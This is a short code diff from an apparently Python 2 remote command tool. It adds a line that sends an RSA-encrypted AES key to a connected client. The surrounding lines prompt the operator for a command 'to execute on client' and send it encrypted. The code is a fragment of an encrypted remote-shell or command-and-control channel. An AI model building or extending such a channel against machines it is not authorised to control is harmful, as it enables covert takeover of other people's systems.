@@ -522,6 +522,8 @@ while True:
                 encryptor16 = PKCS1_OAEP.new(apubKey16)
                 e_key16 = encryptor16.encrypt(ae_key16)
 
+                send_one_message(conn, e_key16)
+
                 cmd = raw_input("Enter in cmd command to execute on client -> ")
 
                 send_one_message(conn, cmd_AES.encrypt(cmd))
